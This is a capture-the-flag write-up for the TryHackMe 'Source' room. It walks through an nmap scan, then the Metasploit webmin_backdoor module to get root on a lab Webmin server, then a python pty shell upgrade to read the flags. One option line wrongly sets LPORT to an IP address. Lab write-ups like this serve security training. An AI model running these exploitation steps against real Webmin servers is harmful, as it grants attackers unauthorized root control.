# ***TryHackMe***- Source : Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

Link to THM Room : [source](https://tryhackme.com/room/source)

## About the room :   

This is pretty easy room created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471)<br>
Since, this room is only 5 days old so I decided to root the machine as quickly as possible, hence, usig Metasploit.<br>
However if you are not sure about using Metasploit, I suggest learning and completing the room [Metasploit](https://tryhackme.com/room/rpmetasploit).<br>
Well without any further ado **let's break in**.

### Methodology :

- **Port Scanning : nmap**
- **Exploit and privilege escalation : metasploit**

**Hop into your terminal**

+ ***nmap to enumerate the ports running on the machine***

>> **nmap -sC -sV -Pn -oN source 10.10.x.x**

Right we have ssh running on 22 and Webmin httpd on 10000.<br>
Let's hop into browser to check what's in the web server.

***Note the website is running on SSL(Secure Socket Layer), therefore, the link would be https://10.10.x.x:10000.***

And here's a login page.<br>
We could definately try bute-forcing with **Hydra** or use **sqlmap** to check the database.<br>
But all these require a little more enumeration to follow, so let's just hop into metasploit for convenience.

+ ***metasploit***

**Back into terminal**   

Type **msfconsole** to fire up metasploit framework.

Once it starts use the **search** command to search for exploits related to **webmin**

>> search webmin

Cool there's exploits for webmin we can use.<br>
Exploits for Remote Command Execution available<br>
However, here's an exploit available as webmin_backdoor which will do our task to create a **backdoor** into admin's machine.<br>
If we can get root privilege straight through the backdoor, why not use it ???<br>

We can simply set the payload with **use exploit_number** or **use full_path** command.

>> use 2

**show options** to veiw the options available for payload.<br>
Simply set RHOSTS - the target machine,<br> RPORT - 10000(here its set by default),<br> LHOST - the listening ip address(our tun0 ip provided by openvpn).<br>
Make sure to set SSL - true(because the server is using SSL).

>> set RHOSTS 10.10.x.x

>> set LPORT your_vpn_ip 

>> set SSL true 

With all the parameters set we are good to go and run the payload. Type **run** or **exploit**

>> run

In no time we get out **session**<br>
If you check with **whoami** , we're in as **root**<br>
Sweet eh ???

Now here we are **root**, but since this shell is unstable at this moment, we can use **python** to get a stable shell.<br>
Simply type the following commands to get a stable shell :

>> shell

>> python -c "import pty;pty.spawn('/bin/bash')"

<img src="/images/import.JPG">

Here we are simply using **python** to spawn a shell i.e /bin/bash.<br>
Type the following commands to make use of /bashrc (can't explain everything here, just know you can't use *clear* command, etc.. yet so)

>> export TERM=xterm

Once this is done we are able to clear screen or use our arrow keys to neviagte to previously used commands.<br>
Well, let's get our **user.txt** and **root.txt** asap...

>> cd /home
>> ls
>> cd dark
>> ls
>> cat user.txt

<img src="/images/user.JPG"> 

Got our first flag i.e user.txt

>> cd /root
>> ls
>> cat root.txt

or simply

>> cat /root/root.txt

<img src="/images/root.JPG"> 

And there we are, **root flag** staring at us. :D

***Finally completed the room, congrats !!!***

***This was fairly an easy machine.***<br>

**Thank you for reading, hope you enjoyed and learned something !!! ;)**

***PS: If you found a sotphisticated way to root this machine other than using Metasploit do add a writeup or DM me on [THM](https://tryhackme.com/p/xavag3djang0) @xavag3djang0 and share your exerience so that I may learn too !***
